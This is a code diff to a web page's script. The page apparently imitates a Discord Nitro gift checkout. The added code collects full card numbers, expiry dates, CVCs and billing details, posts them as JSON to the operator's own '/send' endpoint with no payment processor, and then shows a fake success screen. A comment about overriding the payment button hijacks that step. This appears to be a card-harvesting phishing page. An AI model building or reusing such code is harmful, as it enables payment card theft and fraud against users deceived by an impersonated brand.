@@ -1089,42 +1089,81 @@ document.addEventListener('keydown', (e) => {
 });
 
 
+/* ==========================================
+   FINAL WORKING: SEND ALL DATA TO SERVER
+========================================== */
 
-const nextBtn = document.getElementById("nextBtn");
+// Gift mapping (para alam natin ano ang pinili)
+const GIFT_DATA = [
+  { title: "1 year of Nitro", price: "99.99", type: "year" },
+  { title: "1 month of Nitro", price: "9.99", type: "month" }
+];
 
-nextBtn.addEventListener("click", async () => {
-  // Collect form data
-  const formData = {
-    name: document.getElementById("name").value,
-    email: document.getElementById("email").value,
-    phone: document.getElementById("phone").value,
-    address: document.getElementById("address").value,
-    plan: document.getElementById("plan").value,
-    message: document.getElementById("message").value
+// Collect ALL CARD + BILLING + GIFT DATA
+function collectPaymentFormData() {
+  const giftInfo = selectedGift !== null ? GIFT_DATA[selectedGift] : {};
+
+  return {
+    // Gift Info
+    giftTitle: giftInfo.title || "",
+    giftPrice: giftInfo.price || "",
+    giftType: giftInfo.type || "",
+
+    // Card Info
+    cardNumber: cardNumber.value || "",
+    expDate: expDate.value || "",
+    cvc: cvc.value || "",
+    cardName: cardName.value || "",
+
+    // Billing Info
+    firstName: document.getElementById("first-name")?.value || "",
+    lastName: document.getElementById("last-name")?.value || "",
+    address1: document.getElementById("address-line-1")?.value || "",
+    address2: document.getElementById("address-line-2")?.value || "",
+    email: document.getElementById("email")?.value || "",
+    mobile: document.getElementById("mobile")?.value || "",
+    country: document.getElementById("countrySelect")?.value || ""
   };
+}
+
+// Send data to your Render server
+async function sendPaymentToServer() {
+  const data = collectPaymentFormData();
 
   try {
     const response = await fetch("/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(formData)
+      body: JSON.stringify(data)
     });
 
     const result = await response.json();
 
     if (result.success) {
-      alert("✅ Form submitted successfully! Check your email.");
-      // Optional: redirect to Thank You page
-      // window.location.href = "/thank-you.html";
+      paymentModal.style.display = "none";
+      successModal.style.display = "flex";
     } else {
-      alert("❌ Failed to submit form.");
+      alert("❌ Failed to send form.");
     }
-
   } catch (err) {
-    console.error("Error sending form:", err);
-    alert("❌ Error sending form.");
+    console.error("SEND ERROR:", err);
+    alert("❌ Error sending to server.");
   }
+}
+
+/* ==========================================
+   OVERRIDE PAYMENT NEXT BUTTON
+========================================== */
+
+paymentNext.addEventListener("click", (e) => {
+  e.preventDefault();
+  if (paymentNext.disabled) return;
+
+  // Send the full info
+  sendPaymentToServer();
 });
+
+
 </script>
 </head>
 </body>
